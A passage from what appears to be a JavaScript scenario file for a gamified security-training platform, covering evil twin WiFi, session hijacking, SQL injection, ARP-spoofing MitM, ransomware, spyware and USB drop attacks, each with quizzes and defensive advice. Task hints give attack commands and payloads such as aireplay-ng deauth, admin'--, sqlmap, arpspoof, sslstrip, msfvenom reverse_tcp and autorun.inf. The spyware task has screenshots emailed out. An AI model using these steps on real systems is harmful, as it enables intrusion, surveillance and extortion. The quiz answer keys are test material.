            { id: 4, type: "checklist", title: "DEPLOY ON TARGET", description: "Deploy and run the keylogger silently on the target machine without triggering any visible windows", hint: "Use pythonw.exe to hide console window", locked: false },
            { id: 5, type: "question", title: "HOW TO DETECT IT?", description: "Think about Windows monitoring tools", question: "What Windows tool would you use to detect a running keylogger process?", expectedAnswer: "task manager", hint: "It shows all running processes and can be opened with Ctrl+Shift+Esc", locked: false }
        ]
    },
    {
        id: "fakeap-01",
        name: "FakeAP",
        category: "Fake WiFi Hotspot",
        difficulty: "INTERMEDIATE",
        estimatedTime: "40 MIN",
        tools: ["hostapd", "dnsmasq", "Wireshark", "aircrack-ng"],
        icon: "📡",
        locked: false,
        description: "Set up a rogue access point to intercept traffic",
        objective: {
            whatIsIt: "A fake access point or evil twin attack creates a rogue WiFi hotspot that mimics a legitimate network. Victims unknowingly connect to the attacker controlled network allowing full traffic interception.",
            howItWorks: [
                { step: 1, title: "Clone Network", description: "Create fake WiFi with same SSID as legitimate network using hostapd" },
                { step: 2, title: "Deauth Victims", description: "Force victims off real network so they connect to yours instead" },
                { step: 3, title: "Intercept Traffic", description: "All victim traffic now flows through attacker controlled access point" }
            ],
            missions: [
                "Set up a fake WiFi access point",
                "Force a victim device to connect to it",
                "Intercept and read victim network traffic"
            ],
            mentorAI: {
                intro: "Fake WiFi hotspots mimic legitimate networks to intercept all your internet traffic. Once connected everything you send — even on HTTPS sites — can potentially be intercepted.",
                whyItWorks: "Devices automatically reconnect to networks they recognise. Attackers create hotspots with the same name as coffee shops or offices and deauthenticate victims from the real network forcing them to connect to the fake one.",
                realWorldExample: "In 2017 security researchers demonstrated at DEF CON that thousands of conference attendees automatically connected to a rogue access point named DEF CON within minutes of it being set up.",
                duringTips: [
                    "Your device connected automatically because the network name matches one you previously used",
                    "All your internet traffic now flows through the attacker machine before reaching the internet",
                    "SSL stripping can downgrade HTTPS connections revealing login credentials in plain text",
                    "Even encrypted traffic reveals which sites you visit through DNS queries"
                ],
                postLesson: "Public WiFi is inherently untrusted. Always use a VPN on public networks. Disable auto-connect to WiFi networks on your devices. When on public WiFi avoid accessing banking or sensitive accounts — use mobile data instead."
            },
            guardianAI: {
                redFlags: [
                    "Disconnected from normal network unexpectedly",
                    "Same network name appearing twice in WiFi list",
                    "SSL certificate warnings on normally secure sites",
                    "Websites loading over HTTP instead of HTTPS",
                    "Connected to open network with no password"
                ],
                immediateActions: [
                    "Disconnect from the suspicious network immediately",
                    "Forget the network so device does not reconnect",
                    "Change passwords of any accounts accessed on network",
                    "Enable 2FA on accounts accessed while connected",
                    "Run antivirus scan on your device"
                ],
                futurePrevention: [
                    "Always use a VPN on public WiFi networks",
                    "Disable auto-connect to WiFi on all devices",
                    "Verify network name with staff before connecting",
                    "Avoid accessing sensitive accounts on public WiFi",
                    "Use mobile data for banking and sensitive tasks"
                ]
            }
        },
        quiz: [
            { id: 1, question: "What is an evil twin attack?", options: ["Malware that copies itself", "Fake WiFi mimicking legitimate network", "A type of SQL injection", "DNS poisoning attack"], correctIndex: 1, explanation: "" },
            { id: 2, question: "What tool creates fake AP on Linux?", options: ["nmap", "hostapd", "Wireshark", "netcat"], correctIndex: 1, explanation: "" },
            { id: 3, question: "What is a deauthentication attack?", options: ["Logging users out of web apps", "Forcing WiFi clients to disconnect", "Deleting authentication tokens", "Bypassing 2FA"], correctIndex: 1, explanation: "" },
            { id: 4, question: "What can attacker see on fake AP?", options: ["Only encrypted traffic", "All unencrypted HTTP traffic", "Nothing without SSL strip", "Only metadata"], correctIndex: 1, explanation: "" },
            { id: 5, question: "How to protect against evil twin?", options: ["Use public WiFi freely", "Use VPN on all networks", "Only use 2.4GHz networks", "Connect to strongest signal"], correctIndex: 1, explanation: "" }
        ],
        tasks: [
            { id: 1, type: "checklist", title: "SET UP FAKE ACCESS POINT", description: "Configure hostapd to create a rogue WiFi access point named CorpBank-WiFi that mimics the legitimate network", hint: "Create hostapd.conf with ssid=CorpBank-WiFi", locked: false },
            { id: 2, type: "question", title: "WHAT IS THE SSID?", description: "Check your hostapd configuration", question: "What SSID did you configure for your fake access point?", expectedAnswer: "corpbank-wifi", hint: "It should exactly match the legitimate network name to fool victims", locked: false },
            { id: 3, type: "checklist", title: "CONFIGURE DHCP SERVER", description: "Set up dnsmasq to automatically assign IP addresses to devices that connect to your fake access point", hint: "Configure dnsmasq with dhcp-range", locked: false },
            { id: 4, type: "checklist", title: "FORCE VICTIM TO CONNECT", description: "Send deauthentication packets to disconnect the victim from the real network and force them onto yours", hint: "aireplay-ng --deauth 10 -a [AP MAC]", locked: false },
            { id: 5, type: "question", title: "WHAT TOOL SENDS DEAUTH?", description: "Identify the tool used for deauthentication", question: "What tool did you use to send deauthentication packets?", expectedAnswer: "aireplay-ng", hint: "It is part of the aircrack-ng suite of wireless security tools", locked: false }
        ]
    },
    {
        id: "sess-01",
        name: "SessHijack",
        category: "Session Hijacking",
        difficulty: "INTERMEDIATE",
        estimatedTime: "35 MIN",
        tools: ["Burp Suite", "Browser DevTools", "Wireshark"],
        icon: "🍪",
        locked: false,
        description: "Steal authenticated session tokens",
        objective: {
            whatIsIt: "Session hijacking steals a valid session token to impersonate an authenticated user without needing their password. Session tokens are transmitted in cookies and can be intercepted or stolen via XSS.",
            howItWorks: [
                { step: 1, title: "Steal Token", description: "Intercept session cookie via XSS network sniffing or predictable token generation" },
                { step: 2, title: "Inject Token", description: "Replace your session cookie with the stolen one in your browser" },
                { step: 3, title: "Impersonate", description: "Server thinks you are the victim and grants full authenticated access" }
            ],
            missions: [
                "Intercept a valid session token",
                "Inject the stolen token into your browser",
                "Access the victim account without credentials"
            ],
            mentorAI: {
                intro: "Session hijacking steals your logged-in session to impersonate you without needing your password. Once your session token is stolen the attacker is effectively you on that website.",
                whyItWorks: "Web applications use session tokens to identify logged in users. If these tokens are transmitted over HTTP or lack security flags they can be stolen and replayed by an attacker to gain full account access.",
                realWorldExample: "In 2010 the Firesheep tool demonstrated session hijacking on public WiFi and captured over 200,000 sessions in just days forcing major sites like Facebook and Twitter to enforce HTTPS site-wide.",
                duringTips: [
                    "Your session cookie does not have the HttpOnly flag so JavaScript can read and steal it",
                    "The XSS vulnerability sent your cookie to the attacker server in plain text",
                    "The attacker injected your cookie into their browser — they are now logged in as you",
                    "Changing your password does not invalidate existing sessions — they still have access"
                ],
                postLesson: "Session security depends on both the website and your behaviour. Always use HTTPS sites — the padlock ensures your session token is encrypted in transit. Logging out properly invalidates your session token preventing hijacking."
            },
            guardianAI: {
                redFlags: [
                    "Account showing activity you did not perform",
                    "Session logged out unexpectedly on a site",
                    "Settings or data changed without your action",
                    "Login notification from unknown device or location",
                    "Email or messages sent that you did not write"
                ],
                immediateActions: [
                    "Log out of all sessions immediately using security settings",
                    "Change your password on the affected site now",
                    "Enable 2FA to prevent further unauthorised access",
                    "Review account activity log for unauthorised actions",
                    "Revoke access to any connected third party apps"
                ],
                futurePrevention: [
                    "Always log out properly rather than just closing browser",
                    "Use HTTPS sites only — look for padlock in URL bar",
                    "Enable login notifications on important accounts",
                    "Regularly review active sessions in account settings",
                    "Enable 2FA to make session theft insufficient for access"
                ]
            }
        },
        quiz: [
            { id: 1, question: "What is a session token?", options: ["A physical security key", "Unique identifier for authenticated session", "A type of password", "An encryption certificate"], correctIndex: 1, explanation: "" },
            { id: 2, question: "What cookie flag prevents JavaScript access?", options: ["Secure", "HttpOnly", "SameSite", "Domain"], correctIndex: 1, explanation: "" },
            { id: 3, question: "What attack commonly leads to session hijacking?", options: ["SQL injection", "XSS", "Brute force", "Port scanning"], correctIndex: 1, explanation: "" },
            { id: 4, question: "How do you inject a stolen cookie?", options: ["Restarting the browser", "Using DevTools Application tab", "Editing the URL", "Clearing cache"], correctIndex: 1, explanation: "" },
            { id: 5, question: "What is session fixation?", options: ["Repairing broken sessions", "Forcing victim to use attacker known session", "Extending session timeout", "Encrypting session data"], correctIndex: 1, explanation: "" }
        ],
        tasks: [
            { id: 1, type: "checklist", title: "ANALYSE SESSION COOKIES", description: "Open the target application and use browser DevTools to examine all cookies. Identify the session token and note its security flags", hint: "DevTools Application tab Cookies section", locked: false },
            { id: 2, type: "question", title: "IS HTTPONLY SET?", description: "Check the cookie security flags in DevTools", question: "Does the session cookie have the HttpOnly flag set?", expectedAnswer: "no", hint: "Check the HttpOnly column in the DevTools Application Cookies tab", locked: false },
            { id: 3, type: "checklist", title: "STEAL THE SESSION TOKEN", description: "Use an XSS payload to extract the victim session cookie value and send it to your attacker server", hint: "Use XSS payload from scenario 6", locked: false },
            { id: 4, type: "checklist", title: "INJECT STOLEN TOKEN", description: "Replace your session cookie with the stolen token using browser DevTools Application tab", hint: "DevTools Application Cookies double click value", locked: false },
            { id: 5, type: "question", title: "WHAT HAPPENED AFTER INJECTION?", description: "Refresh the page after injecting the cookie", question: "What happened when you refreshed the page after injecting the stolen cookie?", expectedAnswer: "logged in as victim", hint: "The server accepted the stolen token as a valid authenticated session", locked: false }
        ]
    },
    {
        id: "sqli-01",
        name: "SQLStorm",
        category: "SQL Injection",
        difficulty: "ADVANCED",
        estimatedTime: "45 MIN",
        tools: ["sqlmap", "Burp Suite", "curl", "nmap"],
        icon: "⚡",
        locked: false,
        description: "Bypass authentication and extract databases",
        objective: {
            whatIsIt: "SQL injection allows attackers to interfere with database queries by inserting malicious SQL code into input fields. It can bypass authentication extract entire databases and in some cases execute system commands.",
            howItWorks: [
                { step: 1, title: "Find Injection Point", description: "Identify input passed directly to database query unsanitized" },
                { step: 2, title: "Craft Payload", description: "Build SQL that manipulates query logic to return unintended data" },
                { step: 3, title: "Extract Data", description: "Use UNION attacks or error based techniques to dump database contents" }
            ],
            missions: [
                "Bypass CorpBank login using SQL injection",
                "Extract the complete users table",
                "Find the hidden admin flag in the database"
            ],
            mentorAI: {
                intro: "SQL injection exploits poorly written database queries to bypass authentication or extract data. It is one of the oldest and most dangerous web vulnerabilities — still found in modern apps today.",
                whyItWorks: "When applications directly insert user input into database queries without sanitisation an attacker can inject SQL code that changes the query logic — bypassing logins or dumping entire databases.",
                realWorldExample: "The 2009 Heartland Payment Systems breach used SQL injection to steal 130 million credit card numbers making it one of the largest data breaches in history at that time.",
                duringTips: [
                    "The single quote you typed caused a database error revealing the application is vulnerable to SQLi",
                    "The payload admin'-- comments out the password check making any password valid for admin",
                    "sqlmap is now automatically discovering and dumping every table in the database",
                    "Your entire user database including hashed passwords is now in the attacker's hands"
                ],
                postLesson: "SQL injection is entirely preventable through parameterised queries and prepared statements. As a user if you see database errors on a website report them to the site owner — it is a serious vulnerability that puts all users at risk."
            },
            guardianAI: {
                redFlags: [
                    "Database error messages appearing on website",
                    "Login page accepting any password for an account",
                    "URL containing unusual characters like quotes",
                    "Site responding differently to special characters",
                    "Unusually slow response from database queries"
                ],
                immediateActions: [
                    "Take the vulnerable application offline immediately",
                    "Assume all data in the database is compromised",
                    "Reset passwords for all user accounts",
                    "Notify affected users of potential data breach",
                    "Engage security team for forensic investigation"
                ],
                futurePrevention: [
                    "Use parameterised queries — never concatenate user input",
                    "Implement a Web Application Firewall",
                    "Run regular penetration tests on your applications",
                    "Apply principle of least privilege to database accounts",
                    "Enable detailed logging on all database queries"
                ]
            }
        },
        quiz: [
            { id: 1, question: "What character tests for SQLi?", options: ["%", "#", "'", "@"], correctIndex: 2, explanation: "" },
            { id: 2, question: "What does ' OR 1=1-- do?", options: ["Crashes the database", "Makes condition always true bypassing auth", "Encrypts the query", "Deletes all records"], correctIndex: 1, explanation: "" },
            { id: 3, question: "What is a UNION attack in SQLi?", options: ["Joining two databases", "Appending SELECT to extract more data", "Updating database records", "Deleting table contents"], correctIndex: 1, explanation: "" },
            { id: 4, question: "Which tool automates SQL injection?", options: ["nmap", "Hydra", "sqlmap", "Metasploit"], correctIndex: 2, explanation: "" },
            { id: 5, question: "Best defence against SQLi?", options: ["Input length limits", "Parameterized queries", "Firewall rules", "HTTPS only"], correctIndex: 1, explanation: "" }
        ],
        tasks: [
            { id: 1, type: "checklist", title: "FIND THE INJECTION POINT", description: "Test the CorpBank login form by adding a single quote to the username field and observe the response for SQL error messages", hint: "Add single quote to username and submit", locked: false },
            { id: 2, type: "question", title: "WHAT ERROR DID YOU SEE?", description: "Examine the error message returned by the server", question: "What type of error appeared when you injected a single quote?", expectedAnswer: "sql syntax error", hint: "The database error message revealed the backend query structure", locked: false },
            { id: 3, type: "checklist", title: "BYPASS AUTHENTICATION", description: "Use a SQL injection payload in the username field to bypass the login authentication and access the admin account", hint: "Try admin'-- as username any password", locked: false },
            { id: 4, type: "checklist", title: "ENUMERATE THE DATABASE", description: "Use sqlmap to discover all tables in the database and identify which ones contain sensitive user data", hint: "sqlmap -u target --data user=a&pass=b --tables", locked: false },
            { id: 5, type: "question", title: "WHAT PAYLOAD BYPASSED LOGIN?", description: "Recall the SQL injection payload you used", question: "What SQL injection payload did you use to bypass the login?", expectedAnswer: "admin'--", hint: "The -- comments out the password check in the SQL query", locked: false }
        ]
    },
    {
        id: "mitm-01",
        name: "MitM Cafe",
        category: "Man in the Middle",
        difficulty: "ADVANCED",
        estimatedTime: "50 MIN",
        tools: ["ettercap", "Wireshark", "sslstrip", "arpspoof"],
        icon: "🕵️",
        locked: false,
        description: "Intercept and manipulate network traffic",
        objective: {
            whatIsIt: "Man in the Middle attacks position the attacker between two communicating parties to intercept and potentially modify their communications. The victims believe they are communicating directly with each other.",
            howItWorks: [
                { step: 1, title: "ARP Poison", description: "Send fake ARP replies to trick both victim and router into sending traffic to you" },
                { step: 2, title: "Intercept", description: "All traffic between victim and router now passes through attacker machine" },
                { step: 3, title: "SSL Strip", description: "Downgrade HTTPS to HTTP to read encrypted traffic in plaintext" }
            ],
            missions: [
                "Perform ARP poisoning on the local network",
                "Intercept traffic between victim and router",
                "Strip SSL and capture login credentials"
            ],
            mentorAI: {
                intro: "Man in the Middle attacks silently intercept your communication between you and websites you trust. You think you are talking directly to your bank — but the attacker is secretly in between.",
                whyItWorks: "ARP poisoning tricks your device into sending all traffic through the attacker machine. Combined with SSL stripping this converts encrypted HTTPS traffic to plain HTTP allowing the attacker to read everything including passwords.",
                realWorldExample: "In 2015 the Superfish adware pre-installed on Lenovo laptops performed MitM attacks on all HTTPS traffic including banking sites exposing millions of users to credential theft.",
                duringTips: [
                    "ARP poisoning told your device that the attacker machine is the network gateway — all traffic rerouted",
                    "SSL stripping downgraded your HTTPS connection to HTTP — notice the missing padlock in URL bar",
                    "Every form you submit including passwords is now visible to the attacker in plain text",
                    "Your device has no indication anything is wrong — this attack is completely invisible to victims"
                ],
                postLesson: "VPNs encrypt all traffic end to end making MitM attacks ineffective. Always use a trusted VPN on public networks. Also check for HTTPS and the padlock before entering any credentials — never ignore certificate warnings."
            },
            guardianAI: {
                redFlags: [
                    "Certificate warning appearing on normally safe site",
                    "HTTPS site suddenly loading over HTTP",
                    "Network connection slower than usual",
                    "Same IP appearing for multiple different domains",
                    "ARP table showing unexpected MAC addresses"
                ],
                immediateActions: [
                    "Disconnect from the network immediately",
                    "Do not enter any credentials until on safe network",
                    "Change passwords for any accounts accessed",
                    "Enable 2FA on all accounts accessed on that network",
                    "Report the network compromise to venue management"
                ],
                futurePrevention: [
                    "Use a reputable VPN on all public networks",
                    "Never ignore SSL certificate warnings",
                    "Verify HTTPS before submitting any credentials",
                    "Use mobile data for sensitive activities in public",
                    "Enable HSTS in your browser for maximum protection"
                ]
            }
        },
        quiz: [
            { id: 1, question: "What does ARP stand for?", options: ["Advanced Routing Protocol", "Address Resolution Protocol", "Automated Response Program", "Access Rights Policy"], correctIndex: 1, explanation: "" },
            { id: 2, question: "What is ARP poisoning?", options: ["Corrupting DNS records", "Sending fake ARP replies to redirect traffic", "Injecting malware via ARP", "Blocking ARP requests"], correctIndex: 1, explanation: "" },
            { id: 3, question: "What does SSL stripping do?", options: ["Removes SSL certificates", "Downgrades HTTPS to HTTP", "Steals SSL private keys", "Blocks SSL traffic"], correctIndex: 1, explanation: "" },
            { id: 4, question: "What must be enabled for MitM without DoS?", options: ["Port forwarding", "IP forwarding", "DNS forwarding", "MAC forwarding"], correctIndex: 1, explanation: "" },
            { id: 5, question: "What certificate warning indicates MitM?", options: ["Expired certificate", "Certificate not trusted or wrong domain", "Self signed certificate", "All of the above"], correctIndex: 3, explanation: "" }
        ],
        tasks: [
            { id: 1, type: "checklist", title: "ENABLE IP FORWARDING", description: "Enable IP forwarding on your machine so intercepted packets are forwarded correctly and you create a MitM not a DoS", hint: "echo 1 > /proc/sys/net/ipv4/ip_forward", locked: false },
            { id: 2, type: "question", title: "WHY IS IT NEEDED?", description: "Understand the purpose of IP forwarding", question: "Why must IP forwarding be enabled before ARP poisoning?", expectedAnswer: "to forward packets", hint: "Without it all traffic stops at your machine and the victim loses connectivity", locked: false },
            { id: 3, type: "checklist", title: "PERFORM ARP POISONING", description: "Send fake ARP replies in both directions to position yourself between the victim machine and the gateway", hint: "arpspoof -i eth0 -t victim-ip gateway-ip", locked: false },
            { id: 4, type: "checklist", title: "STRIP SSL ENCRYPTION", description: "Use sslstrip to downgrade HTTPS connections to plain HTTP so you can read the intercepted traffic in plaintext", hint: "sslstrip -l 8080 then redirect via iptables", locked: false },
            { id: 5, type: "question", title: "WHAT DID YOU INTERCEPT?", description: "Review what was captured after SSL stripping", question: "What type of sensitive data were you able to see after stripping SSL?", expectedAnswer: "login credentials", hint: "The victim logged into CorpBank while connected through your fake gateway", locked: false }
        ]
    },
    {
        id: "rnsw-01",
        name: "RansomDrop",
        category: "Ransomware",
        difficulty: "ADVANCED",
        estimatedTime: "50 MIN",
        tools: ["Python", "cryptography library", "Netcat"],
        icon: "🔒",
        locked: false,
        description: "Deploy and analyze ransomware behavior",
        objective: {
            whatIsIt: "Ransomware encrypts victim files and demands payment for the decryption key. It is one of the most damaging forms of malware costing organizations billions annually. Understanding it is essential for building proper defences.",
            howItWorks: [
                { step: 1, title: "Gain Access", description: "Enter target system via phishing exploit or malware download" },
                { step: 2, title: "Encrypt Files", description: "Systematically encrypt all valuable files using strong encryption" },
                { step: 3, title: "Demand Ransom", description: "Leave ransom note with payment instructions and decryption deadline" }
            ],
            missions: [
                "Write a file encryption script",
                "Deploy it on the target system",
                "Understand the decryption and recovery process"
            ],
            mentorAI: {
                intro: "Ransomware encrypts all your files and demands payment to restore access. It is the fastest growing cybercrime and has shut down hospitals banks and government systems worldwide.",
                whyItWorks: "Ransomware uses strong encryption that is mathematically impossible to break without the key. Once it runs there is no technical way to recover files without either paying the ransom or restoring from backup.",
                realWorldExample: "The 2021 Colonial Pipeline ransomware attack shut down fuel supply to the US East Coast for 6 days. The company paid 4.4 million dollars in ransom. FBI later recovered 2.3 million of it.",
                duringTips: [
                    "The ransomware is encrypting every file on your system using strong AES encryption",
                    "The encryption key exists only on the attacker server — you cannot decrypt without it",
                    "Ransom note dropped in every folder demanding payment in cryptocurrency within 48 hours",
                    "Connected network drives and backups accessible from this machine are also being encrypted now"
                ],
                postLesson: "The only real defence against ransomware is offline backups. The 3-2-1 backup rule is keep 3 copies of data on 2 different media types with 1 copy stored offline and offsite. Offline backups cannot be encrypted by ransomware."
            },
            guardianAI: {
                redFlags: [
                    "Files suddenly changing extension to unknown type",
                    "CPU and disk usage spiking with no clear cause",
                    "Ransom note text files appearing in folders",
                    "Files cannot be opened after recent application ran",
                    "Antivirus detecting encryption or ransomware activity"
                ],
                immediateActions: [
                    "Immediately power off the machine — do not shut down normally",
                    "Disconnect all network cables and disable WiFi",
                    "Do NOT pay the ransom — no guarantee of key",
                    "Contact IT security and law enforcement",
                    "Restore from last known clean offline backup"
                ],
                futurePrevention: [
                    "Maintain offline backups using the 3-2-1 backup rule",
                    "Never open email attachments from unknown senders",
                    "Keep all software and OS fully patched and updated",
                    "Disable macros in Office documents by default",
                    "Segment your network to limit ransomware spread"
                ]
            }
        },
        quiz: [
            { id: 1, question: "What encryption do ransomware attacks use?", options: ["Caesar cipher", "Symmetric and asymmetric encryption", "Base64 encoding", "MD5 hashing"], correctIndex: 1, explanation: "" },
            { id: 2, question: "Typical ransom payment method?", options: ["Bank transfer", "Cryptocurrency", "Credit card", "Gift cards"], correctIndex: 1, explanation: "" },
            { id: 3, question: "Best defence against ransomware?", options: ["Better antivirus", "Regular offline backups", "Stronger passwords", "Firewall rules"], correctIndex: 1, explanation: "" },
            { id: 4, question: "What does ransomware target first?", options: ["System files", "Documents photos and databases", "Browser history", "Network settings"], correctIndex: 1, explanation: "" },
            { id: 5, question: "What is double extortion ransomware?", options: ["Encrypts files twice", "Encrypts AND threatens to leak data", "Demands two payments", "Attacks two systems simultaneously"], correctIndex: 1, explanation: "" }
        ],
        tasks: [
            { id: 1, type: "checklist", title: "WRITE ENCRYPTION SCRIPT", description: "Write a Python script using the Fernet library that encrypts all files in a specified target directory", hint: "from cryptography.fernet import Fernet", locked: false },
            { id: 2, type: "question", title: "WHAT ENCRYPTION IS USED?", description: "Identify the encryption type used by Fernet", question: "What type of encryption does Fernet use?", expectedAnswer: "symmetric", hint: "The same key is used for both encrypting and decrypting the files", locked: false },
            { id: 3, type: "checklist", title: "TEST ON SAMPLE FILES", description: "Run your encryption script on the provided test-files directory and verify all files are encrypted successfully", hint: "Only target the /test-files directory", locked: false },
            { id: 4, type: "checklist", title: "CREATE RANSOM NOTE", description: "Generate a README_DECRYPT.txt ransom note in each encrypted directory with payment instructions", hint: "Write README_DECRYPT.txt in each directory", locked: false },
            { id: 5, type: "question", title: "HOW TO RECOVER FILES?", description: "Think about what is required for decryption", question: "What is required to decrypt the files after ransomware encryption?", expectedAnswer: "decryption key", hint: "Without this the files cannot be recovered even by the attacker", locked: false }
        ]
    },
    {
        id: "spy-01",
        name: "SpyAgent",
        category: "Spyware",
        difficulty: "ADVANCED",
        estimatedTime: "45 MIN",
        tools: ["Python", "PIL", "smtplib", "psutil"],
        icon: "🔭",
        locked: false,
        description: "Install covert surveillance on target system",
        objective: {
            whatIsIt: "Spyware silently monitors and collects information from a target system without the users knowledge. It can capture screenshots record audio track location log keystrokes and exfiltrate data to attacker servers.",
            howItWorks: [
                { step: 1, title: "Deploy Silently", description: "Install spyware disguised as legitimate software without user awareness" },
                { step: 2, title: "Monitor and Collect", description: "Continuously capture screenshots keystrokes and system activity" },
                { step: 3, title: "Exfiltrate", description: "Periodically send collected data to attacker controlled server" }
            ],
            missions: [
                "Write a screenshot capture and exfiltration tool",
                "Add process monitoring capability",
                "Establish covert communication channel"
            ],
            mentorAI: {
                intro: "Spyware silently monitors everything you do on your device — capturing screenshots reading messages and tracking your location — all without any visible indication it is running.",
                whyItWorks: "Modern operating systems allow background processes to access screen camera and microphone. Spyware abuses these permissions while disguising itself as a legitimate system process to avoid detection.",
                realWorldExample: "The NSO Group Pegasus spyware was used to surveil journalists politicians and activists in 45 countries. It could activate the microphone camera and read encrypted messages with zero interaction from the victim.",
                duringTips: [
                    "The spyware is capturing screenshots every 30 seconds and storing them in a hidden folder",
                    "All running processes are being logged and sent to the attacker command and control server",
                    "The process is disguised as svchost.exe — a legitimate Windows process making it hard to spot",
                    "Even your typed text and clipboard contents are being captured and exfiltrated"
                ],
                postLesson: "Spyware is prevented by careful application permissions management. Regularly audit which apps have access to your camera microphone and screen. Use physical camera covers and review app permissions on your devices monthly."
            },
            guardianAI: {
                redFlags: [
                    "Unknown processes in task manager using CPU",
                    "Camera or microphone indicator light activating unexpectedly",
                    "Battery draining faster than normal on mobile",
                    "Unusual data usage spikes in network monitor",
                    "Device running hot when apparently idle"
                ],
                immediateActions: [
                    "Disconnect from internet to stop data exfiltration",
                    "Do not use device for any sensitive activity",
                    "Contact IT security for forensic analysis",
                    "Change all passwords from a clean separate device",
                    "Consider full factory reset of the affected device"
                ],
                futurePrevention: [
                    "Regularly audit app permissions for camera mic and screen",
                    "Use physical camera covers on laptops and phones",
                    "Only install apps from official verified app stores",
                    "Review running processes regularly for unknown entries",
                    "Enable alerts for unusual data usage on your device"
                ]
            }
        },
        quiz: [
            { id: 1, question: "What is stalkerware?", options: ["Corporate monitoring software", "Spyware used to monitor intimate partners", "A type of network scanner", "Keylogger variant"], correctIndex: 1, explanation: "" },
            { id: 2, question: "What Python library captures screenshots?", options: ["requests", "PIL/Pillow", "socket", "threading"], correctIndex: 1, explanation: "" },
            { id: 3, question: "How does spyware typically persist?", options: ["Browser cookies", "Registry startup entries", "Temporary files", "Browser cache"], correctIndex: 1, explanation: "" },
            { id: 4, question: "What is a covert channel?", options: ["An encrypted VPN", "Hidden communication to avoid detection", "A dark web forum", "An anonymous email service"], correctIndex: 1, explanation: "" },
            { id: 5, question: "Which tool detects spyware processes?", options: ["nmap", "Process Monitor and Task Manager", "Wireshark", "Metasploit"], correctIndex: 1, explanation: "" }
        ],
        tasks: [
            { id: 1, type: "checklist", title: "BUILD SCREENSHOT TOOL", description: "Write a Python script using PIL that captures periodic screenshots of the target screen silently in the background", hint: "from PIL import ImageGrab then img.save()", locked: false },
            { id: 2, type: "question", title: "WHAT FUNCTION CAPTURES SCREEN?", description: "Identify the PIL function used for screenshots", question: "What PIL function captures a full screenshot?", expectedAnswer: "imagegrab.grab", hint: "It is in the PIL.ImageGrab module and requires no arguments", locked: false },
            { id: 3, type: "checklist", title: "ADD PROCESS MONITORING", description: "Extend your spyware to also log all running processes on the target system using the psutil library", hint: "import psutil then process_iter()", locked: false },
            { id: 4, type: "checklist", title: "SET UP EXFILTRATION CHANNEL", description: "Configure your spyware to automatically email captured screenshots and process logs to your server every 5 minutes", hint: "Use smtplib to email screenshots every 5 min", locked: false },
            { id: 5, type: "question", title: "HOW TO STAY HIDDEN?", description: "Think about Windows process disguise", question: "What process name would you use to disguise your spyware on Windows?", expectedAnswer: "svchost.exe", hint: "It is a legitimate Windows system process that always runs in background", locked: false }
        ]
    },
    {
        id: "usb-01",
        name: "USBdrop",
        category: "USB Malware",
        difficulty: "ADVANCED",
        estimatedTime: "40 MIN",
        tools: ["msfvenom", "rubber-ducky", "autorun", "Python"],
        icon: "💾",
        locked: false,
        description: "Execute malicious payload via USB drop attack",
        objective: {
            whatIsIt: "USB drop attacks leave infected USB drives in public places hoping curious people will plug them in. Once connected the malicious payload executes automatically giving the attacker access to the victim machine.",
            howItWorks: [
                { step: 1, title: "Prepare USB", description: "Load USB with malicious payload configured to autorun on insertion" },
                { step: 2, title: "Drop and Wait", description: "Leave USB in target location car park office lobby reception area" },
                { step: 3, title: "Get Access", description: "When victim plugs in USB payload executes and attacker receives connection" }
            ],
            missions: [
                "Create a USB autorun payload",
                "Understand BadUSB and HID attacks",
                "Simulate USB drop attack in lab environment"
            ],
            mentorAI: {
                intro: "USB drop attacks exploit human curiosity. An attacker leaves infected USB drives in car parks offices or public spaces. When someone plugs them in malware installs automatically without any user interaction required.",
                whyItWorks: "Windows AutoPlay and AutoRun features automatically execute code when removable media is inserted. Even without AutoPlay specially crafted USB drives can exploit drivers at the hardware level before any software runs.",
                realWorldExample: "The Stuxnet worm that sabotaged Iranian nuclear centrifuges was delivered via infected USB drives dropped near the facility. It destroyed 1000 centrifuges and set the nuclear program back by years.",
                duringTips: [
                    "The USB drive autorun executed your payload the moment it was inserted — no clicking required",
                    "A reverse shell is now connecting back to the attacker from inside your network perimeter",
                    "The attacker is now inside your network which may bypass your external firewall protections",
                    "Studies show 45 percent of people plug in USB drives they find in public places"
                ],
                postLesson: "Never plug in USB drives you did not personally purchase from a trusted retailer. Disable AutoPlay on all your devices. Organisations should use endpoint controls to block unknown USB devices from being used on work computers."
            },
            guardianAI: {
                redFlags: [
                    "Unknown USB device inserted by unknown person",
                    "AutoPlay launching unexpected application on insert",
                    "New unknown process starting after USB inserted",
                    "Network traffic to unknown destination after USB use",
                    "Antivirus alert on USB drive contents"
                ],
                immediateActions: [
                    "Remove the USB drive immediately",
                    "Disconnect the machine from the network",
                    "Contact IT security for investigation",
                    "Do not use the machine until it is cleared",
                    "Report where the USB was found to security team"
                ],
                futurePrevention: [
                    "Never plug in USB drives from unknown sources",
                    "Disable AutoPlay and AutoRun on all devices",
                    "Use endpoint security to block unknown USB devices",
                    "Be suspicious of USB drives found in public places",
                    "Purchase USB drives only from reputable retailers"
                ]
            }
        },
        quiz: [
            { id: 1, question: "What makes BadUSB dangerous?", options: ["They spread via WiFi", "USB firmware itself can be compromised", "They require internet", "They only work on Windows"], correctIndex: 1, explanation: "" },
            { id: 2, question: "What is a HID attack?", options: ["Hard drive infection device", "Human Interface Device emulating keyboard", "Hidden identity device", "HTTP injection device"], correctIndex: 1, explanation: "" },
            { id: 3, question: "What percentage plug in found USB drives?", options: ["5%", "10%", "45-98%", "100%"], correctIndex: 2, explanation: "" },
            { id: 4, question: "Best USB security policy?", options: ["Allow all USB devices", "Whitelist only approved devices", "Only allow USB charging", "Disable USB ports entirely"], correctIndex: 1, explanation: "" },
            { id: 5, question: "What does autorun.inf do?", options: ["Updates Windows automatically", "Executes file when USB inserted", "Formats the USB drive", "Scans USB for viruses"], correctIndex: 1, explanation: "" }
        ],
        tasks: [
            { id: 1, type: "checklist", title: "CREATE AUTORUN CONFIGURATION", description: "Create an autorun.inf file that automatically executes your payload when the USB drive is inserted into a Windows machine", hint: "[autorun] open=payload.exe", locked: false },
            { id: 2, type: "question", title: "WHAT IS AUTORUN.INF?", description: "Understand the Windows feature being exploited", question: "What Windows feature does autorun.inf exploit?", expectedAnswer: "autoplay", hint: "Windows automatically runs this feature when removable media is inserted", locked: false },
            { id: 3, type: "checklist", title: "GENERATE REVERSE SHELL PAYLOAD", description: "Use msfvenom to create a reverse shell executable that will run automatically when the USB is inserted", hint: "msfvenom -p windows/meterpreter/reverse_tcp", locked: false },
